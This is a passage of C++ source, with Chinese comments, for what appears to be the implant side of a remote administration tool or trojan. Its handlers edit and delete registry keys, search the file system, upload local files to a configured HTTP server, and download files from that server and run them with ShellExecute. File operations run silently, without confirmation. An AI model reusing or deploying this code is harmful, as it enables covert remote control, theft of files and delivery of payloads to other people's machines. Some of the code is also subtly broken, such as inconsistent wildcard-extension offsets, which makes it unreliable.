		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}
	*pOldDataStart = 0;
	pOldDataStart++;

	char m_NewName[1024] = {0};
	char m_OldName[1024] = {0};
	char *pName = strrchr(pDataStart,'\\');
	if(pName != NULL)
	{
		*pName = 0;
		pName++;
		strcpy(m_NewName,pName);
	}
	else
	{
		strcpy(m_NewName,pDataStart);
		pDataStart[0] = 0;
	}

	char *pOldName = strrchr(pOldDataStart,'\\');
	if(pOldName != NULL)
	{
		*pOldName = 0;
		pOldName++;
		strcpy(m_OldName,pOldName);
	}
	else
	{
		strcpy(m_OldName,pOldDataStart);
		pOldDataStart[0] = 0;
	}

	HKEY m_Rootkey = GetBootKey(m_NewKey);
	HKEY m_Key = NULL;
	long ret = RegOpenKeyEx (m_Rootkey,pDataStart,
					0,KEY_ALL_ACCESS,&m_Key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}

	DWORD m_Type = 0;
	char m_KeyValue[1024] = {0};
	DWORD DataLen = 1024;
	ret = RegQueryValueEx(	m_Key,
							m_OldName,
							NULL,
							&m_Type,
							(BYTE *)m_KeyValue,
							&DataLen
						 );
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_Key);
		m_Command = REG_RENAME_VALUE_ERR;
		len = 0;
		return;
	}

	ret = RegDeleteValue(m_Key,m_OldName);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_Key);
		m_Command = REG_RENAME_VALUE_ERR;
		len = 0;
		return;
	}

	ret = RegSetValueEx(	m_Key,
							m_NewName,
							0,
							m_Type,
							(CONST BYTE *)m_KeyValue,
							DataLen
						);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_Key);
		m_Command = REG_RENAME_VALUE_ERR;
		len = 0;
		return;
	}
	
	RegCloseKey(m_Key);
	m_Command = 0;
	len = 0;
}

void CMyAdminTrans::MyRegDeleteValue(char * m_TransData,DWORD &len,UINT &m_Command)
{
	m_TransData[len] = 0;
	HKEY m_key = NULL;
	char * pDataStart = strchr(m_TransData,'\\');
	if(pDataStart == NULL)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}
	*pDataStart = 0;
	pDataStart++;

	char m_NewName[1024] = {0};
	char *pName = strrchr(pDataStart,'\\');
	if(pName != NULL)
	{
		*pName = 0;
		pName++;
		strcpy(m_NewName,pName);
	}
	else
	{
		strcpy(m_NewName,pDataStart);
		pDataStart[0] = 0;
	}

	HKEY m_Rootkey = GetBootKey(m_TransData);
	long ret = RegOpenKeyEx (m_Rootkey,pDataStart,
						0,KEY_ALL_ACCESS,&m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}

	ret = RegDeleteValue(m_key,m_NewName);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		m_Command = REG_DELETE_KEY_ERR;
		len = 0;
		return ;
	}
	RegCloseKey(m_key);
	m_Command = 0;
	len = 0;
}

void CMyAdminTrans::MyRegDeleteKey(char * m_TransData,DWORD &len,UINT &m_Command)
{
	m_TransData[len] = 0;
	HKEY m_key = NULL;
	char * pDataStart = strchr(m_TransData,'\\');
	
	if(pDataStart == NULL)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}
	*pDataStart = 0;
	pDataStart++;
	if(pDataStart[strlen(pDataStart) - 1] == '\\')
	{
		pDataStart[strlen(pDataStart) - 1] = 0;
	}

	HKEY m_Rootkey = GetBootKey(m_TransData);
	long ret = RegOpenKeyEx (m_Rootkey,pDataStart,
						0,KEY_ALL_ACCESS,&m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}

	ret = SHDeleteKey(m_key,"");
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		m_Command = REG_DELETE_KEY_ERR;
		len = 0;
		return ;
	}
	RegCloseKey(m_key);
	m_Command = 0;
	len = 0;
}

void CMyAdminTrans::MyRegEnumKey(char * m_TransData,DWORD &len,UINT &m_Command)
{
	m_TransData[len] = 0;
	HKEY m_key = NULL;
	char * pDataStart = strchr(m_TransData,'\\');
	if(pDataStart == NULL)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}
	*pDataStart = 0;
	pDataStart++;
	pDataStart[strlen(pDataStart) - 1] = 0;

	HKEY m_Rootkey = GetBootKey(m_TransData);
	long ret = RegOpenKeyEx (m_Rootkey,pDataStart,
						0,KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE,&m_key);
	if(ret == 5)
	{
		//拒绝访问
		m_Command = NOT_FIND_ANY_FILE;
		len = 0;
		return;
	}
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEB_REG_KEY_ERR;
		len = 0;
		return ;
	}

	DWORD		m_Index = 0;
	FILETIME	m_Time;
	DWORD		lpcName = 256;  
	char m_TmpFileName[512] = {0};
	GetTempPath(500,m_TmpFileName);
	strcat(m_TmpFileName,"MyTmpFile.Dat");	
	CFile		m_File;
	if(!m_File.Open(m_TmpFileName,CFile::modeCreate|CFile::modeReadWrite))
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		RegCloseKey(m_key);
		len = 0;
		return;
	}

	REGINFO m_RegInfo = {0};
	REGINFO m_BakRegInfo = {0};
	while(1)
	{
		memset(&m_RegInfo,0,sizeof(REGINFO));
		m_RegInfo.m_Datalen = 510;
		m_RegInfo.m_NameLen = 510;

		ret = RegEnumValue(m_key,m_Index,m_RegInfo.m_Name,&m_RegInfo.m_NameLen,
			NULL,&m_RegInfo.m_DataType,(BYTE*) m_RegInfo.m_Data,&m_RegInfo.m_Datalen);
		if(ret != ERROR_SUCCESS)
		{
			//无新的值
			if(m_Index == 0)
			{
				//空值
				m_BakRegInfo.m_IsKey = FALSE;
				m_BakRegInfo.m_DataType = REG_SZ;
				strcpy(m_BakRegInfo.m_Name,"(默认)");
				m_BakRegInfo.m_NameLen = strlen(m_BakRegInfo.m_Name);
				strcpy(m_BakRegInfo.m_Data,"(数值未设置)");
				m_BakRegInfo.m_Datalen = strlen(m_BakRegInfo.m_Data);
				m_File.Write(&m_BakRegInfo,sizeof(REGINFO));
			}
			break;
		}
		m_RegInfo.m_IsKey = FALSE;
		
		if(m_Index == 0)
		{
			if(strlen(m_RegInfo.m_Name) == 0)
			{
				strcpy(m_RegInfo.m_Name,"(默认)");
				m_RegInfo.m_NameLen = strlen(m_RegInfo.m_Name);
				m_File.Write(&m_RegInfo,sizeof(REGINFO));
				m_Index ++;
				continue;
			}
			m_BakRegInfo.m_IsKey = FALSE;
			m_BakRegInfo.m_DataType = REG_SZ;
			strcpy(m_BakRegInfo.m_Name,"(默认)");
			m_BakRegInfo.m_NameLen = strlen(m_BakRegInfo.m_Name);
			strcpy(m_BakRegInfo.m_Data,"(数值未设置)");
			m_BakRegInfo.m_Datalen = strlen(m_BakRegInfo.m_Data);
			m_File.Write(&m_BakRegInfo,sizeof(REGINFO));
		}
		m_File.Write(&m_RegInfo,sizeof(REGINFO));
		m_Index ++;
	}

	m_Index = 0;
	while(1)
	{
		memset(&m_RegInfo,0,sizeof(REGINFO));
		m_RegInfo.m_Datalen = 510;
		m_RegInfo.m_NameLen = 510;

		ret = RegEnumKeyEx(m_key,m_Index,m_RegInfo.m_Name,&m_RegInfo.m_NameLen,
			NULL,NULL,NULL,&m_Time);
		if(ret != ERROR_SUCCESS)
		{
			//无新的值
			break;
		}
		m_RegInfo.m_IsKey = TRUE;
		m_File.Write(&m_RegInfo,sizeof(REGINFO));
		m_Index ++;
	}
	MakeCompressData(m_TransData,len,m_Command,&m_File);
}

BOOL CMyAdminTrans::FindFile(LPCTSTR m_ParentPath,LPCTSTR FileName,CFile *pFile)
{
	DIRLIST	m_DirList = {0};
	char m_Path[512] = {0};
	char Name1[256] = {0};
	char Name2[256] = {0};
	CTime t;
	strcpy(Name1,FileName);
	_strupr(Name1);
	sprintf(m_Path,"%s\\*.*",m_ParentPath);

	CFileFind m_Find;
	if(!m_Find.FindFile(m_Path))
	{
		m_Find.Close();
		return FALSE;
	}
	while(1)
	{
		if(m_Find.FindNextFile())
		{
			if((m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				strcpy(m_Path,(LPCTSTR) m_Find.GetFilePath());
				if(!FindFile(m_Path,FileName,pFile))
				{
					m_Find.Close();
					return FALSE;
				}
			}
			else if(!m_Find.IsDirectory())
			{
				wsprintf(Name2,"%s",m_Find.GetFileName());
				_strupr(Name2);
				if(!strcmp(Name1,"*") || !strcmp(Name1,"*.*"))
				{
					memset(&m_DirList,0,sizeof(m_DirList));
					strcpy(m_DirList.m_ItemName,m_Find.GetFilePath());
					m_DirList.m_ItemType = 8;
					m_DirList.m_FileLen = (UINT)m_Find.GetLength();
					m_Find.GetCreationTime(t);
					strcpy(m_DirList.m_ModifyTime,(LPCTSTR) 
						t.Format("%Y-%m-%d %H:%M"));
					pFile->Write(&m_DirList,sizeof(m_DirList));
					continue;
				}
				if(Name1[0] == '*' && Name1[1] == '.')
				{
					char * p1 = &Name1[2];
					char * p2 = strrchr(Name2,'.');
					if(p2 != NULL)
					{
						if(!strcmp(p1,p2 + 1))
						{
							memset(&m_DirList,0,sizeof(m_DirList));
							strcpy(m_DirList.m_ItemName,m_Find.GetFilePath());
							m_DirList.m_ItemType = 8;
							m_DirList.m_FileLen = (UINT)m_Find.GetLength();
							m_Find.GetCreationTime(t);
							strcpy(m_DirList.m_ModifyTime,(LPCTSTR) 
								t.Format("%Y-%m-%d %H:%M"));
							pFile->Write(&m_DirList,sizeof(m_DirList));
							continue;
						}
					}
				}
				if(!strcmp(Name1,Name2))
				{
					memset(&m_DirList,0,sizeof(m_DirList));
					strcpy(m_DirList.m_ItemName,m_Find.GetFilePath());
					m_DirList.m_ItemType = 8;
					m_DirList.m_FileLen = (UINT)m_Find.GetLength();
					m_Find.GetCreationTime(t);
					strcpy(m_DirList.m_ModifyTime,(LPCTSTR) 
						t.Format("%Y-%m-%d %H:%M"));
					pFile->Write(&m_DirList,sizeof(m_DirList));
				}
			}
		}
		else
		{
			if((m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				strcpy(m_Path,(LPCTSTR) m_Find.GetFilePath());
				if(!FindFile(m_Path,FileName,pFile))
				{
					m_Find.Close();
					return FALSE;
				}
			}
			else if(!m_Find.IsDirectory())
			{
				wsprintf(Name2,"%s",m_Find.GetFileName());
				_strupr(Name2);
				if(!strcmp(Name1,"*") || !strcmp(Name1,"*.*"))
				{
					memset(&m_DirList,0,sizeof(m_DirList));
					strcpy(m_DirList.m_ItemName,m_Find.GetFilePath());
					m_DirList.m_ItemType = 8;
					m_DirList.m_FileLen = (UINT)m_Find.GetLength();
					m_Find.GetCreationTime(t);
					strcpy(m_DirList.m_ModifyTime,(LPCTSTR) 
						t.Format("%Y-%m-%d %H:%M"));
					pFile->Write(&m_DirList,sizeof(m_DirList));
				}
				if(Name1[0] == '*' && Name1[1] == '.')
				{
					char * p1 = &Name1[3];
					char * p2 = strrchr(Name2,'.');
					if(p2 != NULL)
					{
						if(!strcmp(p1,p2 + 1))
						{
							memset(&m_DirList,0,sizeof(m_DirList));
							strcpy(m_DirList.m_ItemName,m_Find.GetFilePath());
							m_DirList.m_ItemType = 8;
							m_DirList.m_FileLen = (UINT)m_Find.GetLength();
							m_Find.GetCreationTime(t);
							strcpy(m_DirList.m_ModifyTime,(LPCTSTR) 
								t.Format("%Y-%m-%d %H:%M"));
							pFile->Write(&m_DirList,sizeof(m_DirList));
						}
					}
				}
				if(!strcmp(Name1,Name2))
				{
					memset(&m_DirList,0,sizeof(m_DirList));
					strcpy(m_DirList.m_ItemName,m_Find.GetFilePath());
					m_DirList.m_ItemType = 8;
					m_DirList.m_FileLen = (UINT)m_Find.GetLength();
					m_Find.GetCreationTime(t);
					strcpy(m_DirList.m_ModifyTime,(LPCTSTR) 
						t.Format("%Y-%m-%d %H:%M"));
					pFile->Write(&m_DirList,sizeof(m_DirList));
				}
			}
			break;
		}
	}
	m_Find.Close();
	return TRUE;
}

BOOL CMyAdminTrans::FindDir(LPCTSTR m_ParentPath,int & DirCount,int & FileCount,ULONGLONG & AllFileSize)
{
	char m_Path[512] = {0};
	sprintf(m_Path,"%s\\*.*",m_ParentPath);
	CFileFind m_Find;
	if(!m_Find.FindFile(m_Path))
	{
		m_Find.Close();
		return FALSE;
	}
	while(1)
	{
		if(m_Find.FindNextFile())
		{
			if((m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				strcpy(m_Path,(LPCTSTR) m_Find.GetFilePath());
				DirCount++;
				if(!FindDir(m_Path,DirCount,FileCount,AllFileSize))
				{
					m_Find.Close();
					return FALSE;
				}
			}
			else if(!m_Find.IsDirectory())
			{
				FileCount++;
				AllFileSize += m_Find.GetLength();
			}
		}
		else
		{
			if((m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				strcpy(m_Path,(LPCTSTR) m_Find.GetFilePath());
				DirCount++;
				if(!FindDir(m_Path,DirCount,FileCount,AllFileSize))
				{
					m_Find.Close();
					return FALSE;
				}
			}
			else if(!m_Find.IsDirectory())
			{
				FileCount++;
				AllFileSize += m_Find.GetLength();
			}
			break;
		}
	}
	m_Find.Close();
	return TRUE;
}

void CMyAdminTrans::GetCopyList(char * m_TransData,DWORD &len,UINT &m_Command)
{
	char m_TmpFileName[512] = {0};
	GetTempPath(500,m_TmpFileName);
	strcat(m_TmpFileName,"MyTmpFile.Dat");	
	CFile m_File;
	m_File.Open(m_TmpFileName,CFile::modeCreate|CFile::modeReadWrite);
	if(!FindCopyFile(m_TransData,&m_File))
	{
		m_Command = NOT_FIND_ANY_FILE;
		len = 0;
		m_File.Close();
	}
	MakeCompressData(m_TransData,len,m_Command,&m_File);
}

BOOL CMyAdminTrans::FindCopyFile(LPCTSTR m_ParentPath,CFile *pFile)
{
	CFileStatus		m_FileStatus;
	char m_Path[512] = {0};
	strcpy(m_Path,m_ParentPath);
	if(!SetCurrentDirectory(m_Path)) return FALSE;
	
	CFileFind m_Find;
	if(!m_Find.FindFile())
	{
		m_Find.Close();
		return FALSE;
	}
	while(1)
	{
		if(m_Find.FindNextFile())
		{
			if((!m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				CPFILEINFO m_CpFileInfo = {0};
				CFile::GetStatus(m_Find.GetFilePath(),m_FileStatus);
				strcpy(m_CpFileInfo.name,m_FileStatus.m_szFullName);
				m_CpFileInfo.len = (UINT)m_FileStatus.m_size;
				pFile->Write(&m_CpFileInfo,sizeof(CPFILEINFO));
			}
			else if((m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				strcpy(m_Path,(LPCTSTR) m_Find.GetFilePath());
				if(!FindCopyFile(m_Path,pFile))
				{
					m_Find.Close();
					return FALSE;
				}
			}
		}
		else
		{
			if((!m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				CPFILEINFO m_CpFileInfo = {0};
				CFile::GetStatus(m_Find.GetFilePath(),m_FileStatus);
				strcpy(m_CpFileInfo.name,m_FileStatus.m_szFullName);
				m_CpFileInfo.len = (UINT)m_FileStatus.m_size;
				pFile->Write(&m_CpFileInfo,sizeof(CPFILEINFO));
			}
			else if((m_Find.IsDirectory()) && (!m_Find.IsDots()))
			{
				strcpy(m_Path,(LPCTSTR) m_Find.GetFilePath());
				if(!FindCopyFile(m_Path,pFile))
				{
					m_Find.Close();
					return FALSE;
				}
			}
			break;
		}
	}
	m_Find.Close();
	return TRUE;
}

void CMyAdminTrans::PutMyFile(char * m_TransData,DWORD &len,UINT &m_Command,
							  char* m_ServerAddr , int m_ServerPort)
{
	len = 0;
	m_Command = 0;
	LPC_FILE_INFO pInfo = new C_FILE_INFO;
	memcpy(&pInfo->m_ListInfo,m_TransData,sizeof(MYLISTFILEINFO));
	strcpy(pInfo->m_ServerAddr, m_ServerAddr);
	pInfo->m_ServerPort = m_ServerPort;

	//取文件长度
	CFileStatus m_Status;
	if(!CFile::GetStatus(pInfo->m_ListInfo.m_RemoteFile,m_Status))
	{
		delete pInfo;
		m_Command = CAN_NOT_OPEN_FILE;
		return ;
	}
	pInfo->m_ListInfo.m_FileLen = (UINT) m_Status.m_size;
	if(_beginthread(StartUpLoadFile,0, pInfo) == NULL)
	{
		delete pInfo;
		m_Command = CAN_NOT_OPEN_FILE;
	}
}

void CMyAdminTrans::GetMyFile(char * m_TransData, DWORD &len, UINT &m_Command,
								char* m_ServerAddr , int m_ServerPort)
{
	len = 0;
	m_Command = 0;
	LPC_FILE_INFO pInfo = new C_FILE_INFO;
	memcpy(&pInfo->m_ListInfo,m_TransData,sizeof(MYLISTFILEINFO));
	strcpy(pInfo->m_ServerAddr, m_ServerAddr);
	pInfo->m_ServerPort = m_ServerPort;

	//检查文件完整性
	FILE* fp = NULL;
	if(pInfo->m_ListInfo.m_FilePoint > 0)
	{
		fp = fopen(pInfo->m_ListInfo.m_RemoteFile,"r+b");
		if(fp == NULL || fseek(fp, pInfo->m_ListInfo.m_FilePoint, SEEK_SET) != 0)
		{
			if(fp != NULL) fclose(fp);
			m_Command = CAN_NOT_OPEN_FILE;
			return;
		}
	}
	else
	{
		fp = fopen(pInfo->m_ListInfo.m_RemoteFile,"wb");
		if(fp == NULL) 
		{
			m_Command = CAN_NOT_OPEN_FILE;
			return;
		}
	}
	fclose(fp);

	if(_beginthread(StartDlLoadFile,0,pInfo) == NULL)
	{
		delete pInfo;
		m_Command = CAN_NOT_OPEN_FILE;
	}
}

BOOL WINAPI CMyAdminTrans::FileOpertion(LPCTSTR szFileName1,LPCTSTR szFileName2,DWORD opt)
{ 
	SHFILEOPSTRUCT shf; 
	TCHAR sr[MAX_PATH]; 
	TCHAR de[MAX_PATH];
	lstrcpy(sr,szFileName1); 
	sr[lstrlen(sr)+1]='\0'; 
	lstrcpy(de,szFileName2); 
	de[lstrlen(de)+1]='\0'; 
	ZeroMemory(&shf,sizeof(shf)); 
	shf.hwnd=NULL;
	shf.wFunc=opt; 
	shf.pFrom=sr; 
	shf.pTo=de; 
	shf.fFlags=FOF_SILENT|FOF_FILESONLY|FOF_MULTIDESTFILES
		|FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR; 
	return (!(SHFileOperation(&shf)));
} 

void CMyAdminTrans::MakeCompressData(char *m_TransData,DWORD &len)
{
	DWORD m_SrcLen = len;
	BYTE *pSrcData = new BYTE[m_SrcLen];
	memcpy(pSrcData,m_TransData,m_SrcLen);
	len = T_DATALEN;
	compress((LPBYTE) m_TransData,&len,pSrcData,m_SrcLen);
	delete [] pSrcData;
}

void CMyAdminTrans::MakeCompressData(char *m_TransData,DWORD &len,UINT &m_Command,CFile *pFile)
{
	DWORD m_SrcLen = (DWORD) pFile->GetLength();
	if(m_SrcLen == 0)
	{
		len = 0;
		m_Command = 0;
		pFile->Close();
		return;
	}
	BYTE *pSrcData = new BYTE[m_SrcLen];
	pFile->SeekToBegin();
	pFile->Read(pSrcData,m_SrcLen);
	pFile->Close();
	len = T_DATALEN;
	compress((LPBYTE) m_TransData,&len,pSrcData,m_SrcLen);
	m_Command = 0;
	delete [] pSrcData;
}

void CMyAdminTrans::GetServicesConfig(SC_HANDLE hMana,LPMYSERVICES pServices)
{
	SC_HANDLE hServices = OpenService(hMana,
		pServices->m_Name,SERVICE_ALL_ACCESS);
	if(hServices == NULL) return;
	DWORD m_NeedLen = 0;
	BYTE *pData = new BYTE[8192];
	memset(pData,0,8192);
	LPQUERY_SERVICE_CONFIG pConFig = (LPQUERY_SERVICE_CONFIG) pData;
	if(QueryServiceConfig(hServices,pConFig,
		8192,&m_NeedLen))
	{
		pServices->dwErrorControl = pConFig->dwErrorControl;
		pServices->dwServiceType = pConFig->dwServiceType;
		pServices->dwStartType = pConFig->dwStartType;
		pServices->dwTagId = pConFig->dwTagId;
		strcpy(pServices->lpBinaryPathName,pConFig->lpBinaryPathName);
		strcpy(pServices->lpDependencies,pConFig->lpDependencies);
		strcpy(pServices->lpLoadOrderGroup,pConFig->lpLoadOrderGroup);
		strcpy(pServices->lpServiceStartName,pConFig->lpServiceStartName);
		sprintf((char*)pData,"SYSTEM\\ControlSet001\\Services\\%s"
			,pServices->m_Name);
		MyGetKeyStr((char*) pData,"Description",pServices->lpDescribe);
	}
	delete [] pData;
	CloseServiceHandle(hServices);
}

//文件下载运行
void CMyAdminTrans::StartUpLoadFile(LPVOID lPvoid)
{
	//拷贝数据
	C_FILE_INFO m_Info = {0};
	memcpy(&m_Info,lPvoid,sizeof(C_FILE_INFO));
	delete (LPC_FILE_INFO) lPvoid;

	CMyHttpBase m_HttpFile;
	if(!m_HttpFile.ConnectHttpServer(m_Info.m_ServerAddr,
		m_Info.m_ServerPort, CONN_FILE_UP, 
		INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_NO_CACHE_WRITE))
		return ;

	//发送数据包头
	INTERNET_BUFFERS BufferIn = {0};
	BufferIn.dwStructSize = sizeof( INTERNET_BUFFERS );
	BufferIn.dwBufferTotal = m_Info.m_ListInfo.m_FileLen + sizeof(MYLISTFILEINFO);
	if(!HttpSendRequestEx(m_HttpFile.hHttpFp,&BufferIn,NULL,HSR_INITIATE,0))
		return ;
	DWORD dwBytesWritten = 0;
	if(!InternetWriteFile(m_HttpFile.hHttpFp , 
		(char*) &m_Info.m_ListInfo , sizeof(MYLISTFILEINFO) , &dwBytesWritten))
		return ;

	//打开文件
	FILE* fp = fopen(m_Info.m_ListInfo.m_RemoteFile,"rb");
	if(fp == NULL) return ;

	//移动文件指针
	if(m_Info.m_ListInfo.m_FilePoint > 0)
	{
		if(fseek(fp, m_Info.m_ListInfo.m_FilePoint, SEEK_SET) != 0)
		{
			fclose(fp);
			return;
		}
		m_Info.m_ListInfo.m_FileLen -= m_Info.m_ListInfo.m_FilePoint;
	}
    
	char  m_FileBuf[131079] = {0};
	while(m_Info.m_ListInfo.m_FileLen > 0)
	{
		//读数据
		DWORD len = (m_Info.m_ListInfo.m_FileLen > 131072) ? 
			131072 : m_Info.m_ListInfo.m_FileLen;
		fread(m_FileBuf,len,1,fp);

		//发送数据
		if(!InternetWriteFile(m_HttpFile.hHttpFp , 
			m_FileBuf , len , &dwBytesWritten))
			break;

		m_Info.m_ListInfo.m_FileLen -= dwBytesWritten;
	}

	//清理资源
	fclose(fp);
	HttpEndRequest(m_HttpFile.hHttpFp,NULL,0,0);
}

//文件上传运行
void CMyAdminTrans::StartDlLoadFile(LPVOID lPvoid)
{
	//拷贝数据
	C_FILE_INFO m_Info = {0};
	memcpy(&m_Info,lPvoid,sizeof(C_FILE_INFO));
	delete (LPC_FILE_INFO) lPvoid;

	CMyHttpBase m_HttpFile;
	if(!m_HttpFile.ConnectHttpServer(m_Info.m_ServerAddr,
		m_Info.m_ServerPort, CONN_FILE_DL, 
		INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_NO_CACHE_WRITE))
		return ;

	//发送连接
	if(!HttpSendRequest(m_HttpFile.hHttpFp , 
		NULL , 0 , &m_Info.m_ListInfo, sizeof(MYLISTFILEINFO)))
		return ;

	//打开文件
	FILE* fp = NULL;

	//查看是否需要移动指针
	if(m_Info.m_ListInfo.m_FilePoint > 0)
	{
		fp = fopen(m_Info.m_ListInfo.m_RemoteFile,"r+b");
		if(fp == NULL || fseek(fp, m_Info.m_ListInfo.m_FilePoint, SEEK_SET) != 0)
		{
			if(fp != NULL) fclose(fp);
			return;
		}
		m_Info.m_ListInfo.m_FileLen -= m_Info.m_ListInfo.m_FilePoint;
	}
	else
	{
		fp = fopen(m_Info.m_ListInfo.m_RemoteFile,"wb");
		if(fp == NULL) return;
	}

	//接收数据
	DWORD dwBytesWritten = 0;
	char  m_FileBuf[131079] = {0};
	while(m_Info.m_ListInfo.m_FileLen > 0)
	{
		//读数据
		DWORD len = (m_Info.m_ListInfo.m_FileLen > 131072) ? 
			131072 : m_Info.m_ListInfo.m_FileLen;
		if(!InternetReadFile(m_HttpFile.hHttpFp , 
			m_FileBuf , len , &dwBytesWritten) || 
			dwBytesWritten == 0)
		{
			fclose(fp);
			return;
		}
		//写文件
		fwrite(m_FileBuf,len,1,fp);
		m_Info.m_ListInfo.m_FileLen -= len;
	}
	fclose(fp);

	//查看是否需要运行
	if(m_Info.m_ListInfo.m_IsExec)
		ShellExecute(NULL,NULL,m_Info.m_ListInfo.m_RemoteFile,
			NULL,NULL,SW_SHOW);
}

